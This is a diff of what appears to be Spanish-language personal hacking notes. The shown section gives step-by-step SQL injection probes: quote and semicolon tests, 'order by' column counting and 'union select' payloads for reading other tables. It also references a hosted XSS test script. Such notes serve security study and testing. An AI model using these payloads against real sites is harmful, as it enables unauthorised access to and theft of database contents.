@@ -75,7 +75,7 @@ http://xss.rocks/xss.js
 #SQL INJECTION
 Para SQL injection con forma "?palabra=3" podemos poner "?palabra=3 union all select *, *, *, ... (las columnas que creamos que tiene) from [tabla que queremos ver]"
 Los comentarios pueden ser con -- o con #
-Ponemos ' y si es vulnerable, a probar
+Ponemos ' o ; y si es vulnerable, a probar
 
 ' order by 1 # E ir probando 10, 20, si da error 15, y vamos acotando, hasta llegar al último que no dé error
 ' union select 1 -- y luego ' union select 1, 2 -- Hasta que no dé error. Para identificar el parámetro vulnerable, el número que se muestre es el que lo es. Si se muestra el 2, quiere decir que tenemos que pedir los datos en el segundo parámetro
